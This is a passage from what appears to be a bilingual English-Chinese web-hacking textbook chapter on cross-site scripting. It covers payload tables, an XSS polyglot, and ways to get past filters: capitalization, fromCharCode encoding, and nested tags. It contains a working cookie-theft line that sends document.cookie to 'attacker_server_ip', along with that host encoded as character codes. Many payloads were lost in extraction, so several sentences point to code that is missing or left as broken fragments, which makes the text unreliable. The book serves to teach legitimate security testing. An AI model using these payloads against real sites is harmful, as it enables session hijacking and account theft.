">
    This payload closes the string that was supposed to contain the user input by providing a double quote, then closes the
    tag with a tag ending in
     />
    . Finally, the payload injects a complete script tag after the
    tag.
    此负载通过提供一个双引号关闭原本应包含用户输入的字符串，然后使用以/>结束的标签关闭标签。最后，在标签之后注入完整的标签。
    If your payload is not working, you can check whether your payload caused syntax errors in the returned document. You can inspect the returned document in your proxy and look for unclosed tags or other syntax issues. You can also open your browser’s console and see if the browser runs into any errors loading the page. In Firefox, you can open the console by right-clicking the page and choosing
     Inspect Element
     ▶
     Console
    .
    如果您的有效载荷无法工作，请检查返回文档中是否存在语法错误引起的问题。您可以在代理中检查返回文档并查找未封闭标签或其他语法问题。您还可以打开浏览器的控制台，查看浏览器是否遇到任何加载页面的错误。在 Firefox 中，您可以通过右键单击页面并选择“检查元素”▶“控制台”来打开控制台。
    You can find more common XSS payloads online.
     Table 6-1
    lists some examples.
    你可以在网上找到更常见的XSS负载。表6-1列出了一些例子。
       Table 6-1
      : Common XSS Payloads
      表 6-1：常见的 XSS 载荷
         Payload
         Purpose
        This is the most generic XSS payload. It will generate a pop-up box if the payload succeeds.
        This payload loads JavaScript code within an iframe. It’s useful when
        tags are banned by the XSS filter.
        This payload is useful when your input string can’t contain the term
         script
        . It inserts an HTML element that will run JavaScript automatically after it’s loaded.
         ">
        This payload closes out the previous tag. It then injects an
        tag with an invalid source URL. Once the tag fails to load, it will run the JavaScript specified in the
         onerror
        attribute.
         alert(1)test
        This payload inserts a link that will cause JavaScript to execute after a user hovers over the link with their cursor.
        This payload causes the browser to load and run an external script hosted on the attacker’s server.
    Hackers have designed many more creative payloads. Search
     XSS payloads
    online for more ideas. That said, taking a long list of payloads and trying them one by one can be time-consuming and unproductive. Another way of approaching manual XSS testing is to insert an
     XSS polyglot
    , a type of XSS payload that executes in multiple contexts. For example, it will execute
    regardless of whether it is inserted into an
    tag, a
    tag, or a generic
    tag and can bypass some XSS filters. Take a look at this polyglot payload published by EdOverflow at
     https://polyglot.innerht.ml/
    :
    黑客设计了许多更有创意的有效负载。在线搜索XSS有效负载以获取更多想法。话虽如此，一个一个地尝试长列表的有效负载可能耗费时间且无效。手动测试XSS的另一种方法是插入XSS多语言，这是一种在多个上下文中执行的类型的XSS有效负载。例如，它将在无论是插入到标记、标记还是通用的标记中执行，并可以绕过一些XSS过滤器。请查看EdOverflow在https://polyglot.innerht.ml/上发布的这个多语言有效负载：
javascript:"/*\"/*`/*' /*
-->&lt;svg onload=/*
    The details of this payload are beyond the scope of the book, but it contains multiple ways of creating an XSS—so if one method fails, another one can still induce the XSS.
    本书不涉及此有效载荷的细节，但它包含多种创建XSS的方法-因此，如果一种方法失败，另一种方法仍然可以诱发XSS。
    Another way of testing for XSS more efficiently is to use generic test strings instead of XSS payloads. Insert a string of special HTML characters often used in XSS payloads, such as the following:
     >' '
    tags in user input. If that is the case, try executing XSS that doesn’t use a
    tag. For example, remember that in certain scenarios, you can specify JavaScript to run in other types of tags. When you try to construct an XSS payload, you can also try to insert code into HTML tag names or attributes instead. Say user input is passed into an HTML image tag, like this:
    通常，应用程序会对用户输入中的标签进行清理。如果是这种情况，请尝试执行不使用标签的XSS。例如，请记住，在某些情况下，您可以指定在其他类型的标记中运行JavaScript。在尝试构造XSS有效载荷时，您也可以尝试将代码插入HTML标记名称或属性中。例如，假设用户输入被传递到HTML图像标记中，如下所示：
    Instead of closing out the image tag and inserting a script tag, like this
    不要关闭图像标签并插入脚本标签，应该这样做：
"/>
    you can insert the JavaScript code directly as an attribute to the current tag:
    你可以把 JavaScript 代码直接作为当前标签的属性插入：
    Another way of injecting code without the
    tag is to use the special URL schemes mentioned before. This snippet will create a Click me! link that will generate an alert box when clicked:
    另外一种在不使用标签的情况下注入代码的方式是使用之前提到的特殊URL方案。以下代码片段将创建一个“点击我！”链接，单击后将生成一个警告框：
Click me!"
    Capitalization and Encoding
    You can also mix different encodings and capitalizations to confuse the XSS filter. For example, if the filter filters for only the string
     "script"
    , capitalize certain letters in your payload. Since browsers often parse HTML code permissively and will allow for minor syntax issues like capitalization, this won’t affect how the script tag is interpreted:
    你也可以混合不同的编码和大小写来迷惑XSS过滤器。例如，如果过滤器只过滤字符串"script"，则可以在负载中将某些字母大写。由于浏览器通常宽松解析HTML代码并允许大小写等小的语法问题，这不会影响脚本标记的解释方式。
    If the application filters special HTML characters, like single and double quotes, you can’t write any strings into your XSS payload directly. But you could try using the JavaScript
     fromCharCode()
    function, which maps numeric codes to the corresponding ASCII characters, to create the string you need. For example, this piece of code is equivalent to the string
     "http://attacker_server_ip/?c="
    :
    如果应用程序过滤特殊的HTML字符，比如单引号和双引号，你就不能直接将任何字符串写入XSS有效负载中。但是你可以尝试使用JavaScript fromCharCode()函数，将数字代码映射到相应的ASCII字符，来创建所需的字符串。例如，以下代码段等同于字符串"http://attacker_server_ip/?c="。
String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107,
101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)
    This means you can construct an XSS payload without quotes, like this:
    这意味着您可以构建一个没有引号的 XSS 载荷，如下所示：
    The
     String.fromCharCode()
    function returns a string, given an input list of ASCII character codes. You can use this piece of code to translate your exploit string to an ASCII number sequence by using an online JavaScript editor, like
     https://js.do/
    , to run the JavaScript code or by saving it into an HTML file and loading it in your browser:
    String.fromCharCode() 函数返回一个字符串，给定一个 ASCII 字符代码列表输入。您可以使用此代码段，通过使用在线 JavaScript 编辑器（如 https://js.do/）运行 JavaScript 代码或将其保存到 HTML 文件中并在浏览器中加载，将 exploit 字符串转换为 ASCII 数字序列。
    The
     ascii()
    function
     1
    converts characters to their ASCII numeric representation. We run each character in the input string through
     ascii()
     2
    . Finally, we write the translated string to the document
     3
    . Let’s translate the payload
     http://attacker_server_ip/?c=
    by using this code:
    ascii（）函数将字符转换为它们的ASCII数字表示形式。我们将输入字符串中的每个字符通过ascii（）函数运行。最后，我们将翻译后的字符串写入文件。使用此代码翻译有效负载http://attacker_server_ip/？c =。
    This JavaScript code should print out
     "104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61"
    . You can then use it to construct your payload by using the
     fromCharCode()
    method.
    这段 JavaScript 代码应该会打印出 "104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61"。然后，您可以使用 fromCharCode() 方法来构造有效载荷。
    Filter Logic Errors
    Finally, you could exploit any errors in the filter logic. For example, sometimes applications remove all
    tags in the user input to prevent XSS, but do it only once. If that’s the case, you can use a payload like this:
    最后，您可以利用过滤逻辑中的任何错误。例如，有时应用程序会删除用户输入中的所有标签以防止XSS，但只做一次。如果是这种情况，您可以使用此类有效负载：
t>
location='http://attacker_server_ip/c='+document.cookie;
t>
    Notice that each
    tag cuts another
    tag in two. The filter won’t recognize those broken tags as legitimate, but once the filter removes
    the intact tags from this payload, the rendered input becomes a perfectly valid piece of JavaScript code:
    请注意每个标记都会将另一个标记分成两个部分。过滤器不会将这些断裂的标记识别为合法标记，但一旦过滤器从这个有效载荷中移除完整的标记，渲染的输入就变成了一个完美有效的JavaScript代码。
    These are just a handful of the filter-bypass techniques that you can try. XSS protection is difficult to do right, and hackers are constantly coming up with new techniques to bypass protection. That’s why hackers are still constantly finding and exploiting XSS issues in the wild. For more filter-bypass ideas, check out OWASP’s XSS filter evasion cheat sheet (
     https://owasp.org/www-community/xss-filter-evasion-cheatsheet